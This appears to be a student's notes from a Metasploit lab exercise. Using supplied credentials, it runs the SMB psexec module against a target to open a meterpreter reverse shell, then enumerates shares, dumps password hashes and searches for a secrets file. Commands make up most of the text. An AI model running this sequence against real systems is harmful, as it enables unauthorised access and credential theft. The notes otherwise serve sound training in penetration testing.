* Gathering further information about the target system.
* Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
* Privilege escalation.
* Lateral movement.
  
  
  
  

---

## Practica:

Attacker:  10.67.112.134

Target: 10.67.133.255

Exploit: SMB exploit/windows/smb/psexec

Username: ballen

Password: Password1



```bash
msf6 > search exploit/windows/smb/psexec
msf6 > use 0
msf6 exploit(windows/smb/psexec) > options
msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set rhosts 10.67.133.255
msf6 exploit(windows/smb/psexec) > set SMBuser ballen
msf6 exploit(windows/smb/psexec) > set SMBpass Password1
msf6 exploit(windows/smb/psexec) > run

---

meterpreter > sysinfo
meterpreter > background

---
msf6 exploit(windows/smb/psexec) > search post/windows/gather/enum_shares

msf6 exploit(windows/smb/psexec) > use 0
msf6 exploit(windows/smb/psexec) > options
msf6 exploit(windows/smb/psexec) > set session 1
msf6 exploit(windows/smb/psexec) > run

[aca otra respuesta]

msf6 exploit(windows/smb/psexec) > sessions -i 1

---
meterpreter > hashdump
meterpreter > search -f secrets.txt
meterpreter >



```
